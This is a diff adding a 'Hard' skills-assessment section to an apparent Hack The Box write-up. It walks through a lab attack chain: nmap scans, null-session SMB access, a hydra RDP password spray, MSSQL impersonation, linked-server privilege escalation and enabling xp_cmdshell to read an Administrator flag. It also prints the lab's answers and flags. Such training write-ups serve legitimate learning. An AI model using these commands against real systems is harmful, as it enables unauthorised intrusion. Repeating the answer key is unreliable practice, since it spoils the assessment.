@@ -9,6 +9,7 @@
 7. [Skills Assessment](#skill-assesment)
     1. [Easy](#easy)
     2. [Medium](#medium)
+    3. [Hard](#hard)
 
 ### FTP
 #### Tools
@@ -451,3 +452,90 @@
     ssh -o KexAlgorithms=diffie-hellman-group14-sha256 -o Ciphers=aes256-ctr simon@10.129.201.127
     ```
     We can find flag in there. The answer is `HTB{1qay2wsx3EDC4rfv_M3D1UM}`.
+
+## Hard
+1. What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)
+
+    First, i enumerate the server by using nmap. First scan for initial scan, second scan for detail result.
+
+    ```bash
+    sudo nmap -p- --min-rate=10000 10.129.203.10
+    sudo nmap -sV -sC 10.129.203.10 -v
+    ``` 
+
+    Because the total number of port is same, ill show the second scan result.
+
+    ![alt text](Assets/SA-HARD1.png)
+
+    We can see it has several running service such as SMB, MS-SQL, and RDP. I tried to check if SMB service allowed null passowrd.
+
+    ```bash
+    smbclient -L //10.129.203.10 -U simon -N
+    ```
+
+    ![alt text](Assets/SA-HARD2.png)
+
+    Its work!. Then we can enemurate that. 
+
+    ```bash
+    smbclient //10.129.203.10/Home -U simon -N
+    ```    
+    In the IT folder, inside it, we can find simon folder. In there we can find `random.txt` file. So the answer is `random.txt`.
+
+2. Enumerate the target and find a password for the user Fiona. What is her password?
+
+    Still in the smb session, go back to IT folder. But now instead going to simon, we can check Fiona folder. In there we can find `creds.txt`. Because `creds.txt` contain many passwords, we can bruteforce rdp with hydra to find the correct one.
+
+    ```bash
+    hydra -l Fiona -P creds.txt rdp://10.129.203.10 -t 4
+    ```
+    We can get valid credential from there, `Fiona:48Ns72!bns74@S84NNNSl`. The answer is `48Ns72!bns74@S84NNNSl`.
+
+3. Once logged in, what other user can we compromise to gain admin privileges?
+     
+    By using fiona credential, we can login with mssqlclient.
+
+    ```bash
+    mssqlclient.py -p 1433 fiona@10.129.203.10 -windows-auth
+    ```
+    Then in there, we can run this to find user that fiona can impersionate.
+    
+    ```SQL
+    SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+    ```
+    ![alt text](Assets/SA-HARD3.png)
+
+    We can see that we can impersonate john and simon. Fisrt, we test by impersionate user john and check its previllege.
+    
+    ```SQL
+    EXECUTE AS LOGIN = 'john';
+    SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin');
+    ```
+    ![alt text](Assets/SA-HARD4.png)
+
+    Based on that, john doesnt have admin previllege. But we can escalate previllege by linked server path.
+
+    ```SQL
+    EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
+    ```
+
+    ![alt text](Assets/SA-HARD5.png)
+
+    So the answer is `John`.
+
+4. Submit the contents of the flag.txt file on the Administrator Desktop.
+
+    We can enable xp_cmdshell on the linked server first to read the flag.
+
+    ```SQL
+    EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV];
+    EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
+    EXEC ('sp_configure ''xp_cmdshell'',1') AT [LOCAL.TEST.LINKED.SRV];
+    EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
+    ```
+    Then we can read the flag by using xp_cmdshell.
+
+    ```SQL
+    EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV];
+    ```
+    The answer is `HTB{46u$!n9_l!nk3d_$3rv3r$}`.
